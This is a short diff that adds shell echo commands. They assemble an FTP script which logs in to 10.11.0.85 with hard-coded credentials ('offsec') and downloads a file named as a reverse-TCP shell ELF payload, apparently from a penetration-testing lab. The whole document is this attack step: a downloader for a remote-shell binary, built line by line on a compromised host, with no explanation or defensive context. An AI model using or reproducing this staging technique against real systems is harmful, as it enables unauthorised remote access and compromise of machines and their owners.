@@ -1,0 +1,13 @@
+echo '#!/bin/sh' > linux-ftp.sh
+echo "HOST='10.11.0.85'" >> linux-ftp.sh
+echo "USER='offsec'" >> linux-ftp.sh
+echo "PASSWD='Notb4igo'" >> linux-ftp.sh
+echo "FILE='10.11.0.85-44444-reverse-tcp.elf'" >> linux-ftp.sh
+echo "" >> linux-ftp.sh
+echo "ftp -n \$HOST <<HEREDOC " >> linux-ftp.sh
+echo "quote USER \$USER" >> linux-ftp.sh
+echo "quote PASS \$PASSWD" >> linux-ftp.sh
+echo "bin" >> linux-ftp.sh
+echo "get \$FILE" >> linux-ftp.sh
+echo "quit" >> linux-ftp.sh
+echo "HEREDOC" >> linux-ftp.sh
